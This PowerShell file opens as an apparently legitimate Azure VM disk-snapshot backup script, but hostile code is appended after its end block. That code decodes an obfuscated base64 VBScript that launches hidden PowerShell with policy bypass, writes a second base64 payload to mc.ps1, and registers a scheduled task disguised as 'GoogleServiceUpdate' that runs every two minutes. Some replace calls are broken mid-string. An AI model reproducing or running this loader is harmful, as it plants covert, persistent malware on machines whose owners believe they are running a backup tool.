
[CmdletBinding()]
param (
	[Parameter(Mandatory,
		ValueFromPipeline)]
	[string[]]$AzureVM,
	[string]$ServiceName = 'ADBCLOUD',
	[switch]$Overwrite
)

begin {
	Set-StrictMode -Version Latest
	try {
		$AzureModuleFilePath = "$($env:ProgramFiles)\Microsoft SDKs\Windows Azure\PowerShell\ServiceManagement\Azure\Azure.psd1"
		if (!(Test-Path $AzureModuleFilePath)) {
			Write-Error 'Azure module not found'
		} else {
			Import-Module $AzureModuleFilePath	
		}
		
		$script:BackupContainer = 'backups'
		
		function New-Snapshot([Microsoft.WindowsAzure.Commands.ServiceManagement.Model.PersistentVMModel.OSVirtualHardDisk]$Disk) {
			$Blob = $Disk.MediaLink.Segments[-1]
			$Container = $Disk.MediaLink.Segments[-2].TrimEnd('/')
			$BlobCopyParams = @{
				'SrcContainer' = $Container;
				'SrcBlob' = $Blob;
				'DestContainer' = $BackupContainer
			}
			if ($Overwrite.IsPresent) {
				$BlobCopyParams.Force = $true	
			}
			Start-AzureStorageBlobCopy @BlobCopyParams
			
		}
		
		
		if (!(Get-AzureStorageContainer -Name $BackupContainer -ea SilentlyContinue)) {
			Write-Verbose "Container $BackupContainer not found.  Creating..."
			New-AzureStorageContainer -Name $BackupContainer -Permission Off
		}
		
	} catch {
		Write-Error $_.Exception.Message
		exit
	}
}

process {
	try {
		foreach ($Vm in $AzureVM) {
			$Vm = Get-AzureVM -ServiceName $ServiceName -Name $Vm
			if ($Vm.Status -ne 'StoppedVM') {
				if ($Vm.Status -eq 'ReadyRole') {
					Write-Verbose "VM $($Vm.Name) is started.  Bringing down into a provisioned state"
					
					$Vm | Stop-AzureVm -StayProvisioned
				} elseif ($Vm.Status -eq 'StoppedDeallocated') {
					Write-Verbose "VM $($Vm.Name) is stopped but not in a provisioned state."
					
					Write-Verbose "Starting up VM $($Vm.Name)..."
					$Vm | Start-AzureVm
					while ((Get-AzureVm -ServiceName $ServiceName -Name $Vm.Name).Status -ne 'ReadyRole') {
						sleep 5
						Write-Verbose "Waiting on VM $($Vm.Name) to be in a ReadyRole state..."
					}
					Write-Verbose "VM $($Vm.Name) now up.  Bringing down into a provisioned state..."
					$Vm | Stop-AzureVm -StayProvisioned
				}
				
			}
			
			$OsDisk = $Vm | Get-AzureOSDisk
			Get-AzureSubscription | Set-AzureSubscription -CurrentStorageAccountName ($OsDisk.MediaLink.Host.Split('.')[0])
			
			
			New-Snapshot -Disk $OsDisk
		
			
			$DataDisks = $Vm | Get-AzureDataDisk
			if ($DataDisks) {
				foreach ($DataDisk in $DataDisks) {
					New-Snapshot -Disk $DataDisk
				}
			}
		}
	} catch {
		Write-Error $_.Exception.Message
		exit
	}
}

end {
	try {
		
	} catch {
		Write-Error $_.Exception.Message
	}
}
$path= "$env:userprofile\appdata\local\microsoft\Windows"

if(-not(Test-Path -Path($path)))
{mkdir $path}

$fileout="$path\L69742.vbs";

$encstrvbs="c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K";

$bytevbs=[System.Convert]::FromBase64String($encstrvbs);

$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);

$strvbs = $strvbs.replace('

set-content $fileout $strvbs;

$tmpfile="$env:TEMP\U1848931.TMP";



$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();


$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace('

set-content "$path\mc.ps1" $pscode


$taskstr="schtasks /create /F /sc minute /mo 2 /tn ""GoogleServiceUpdate"" /tr ""\""$fileout""\""   ";



iex 'cmd /c $taskstr';

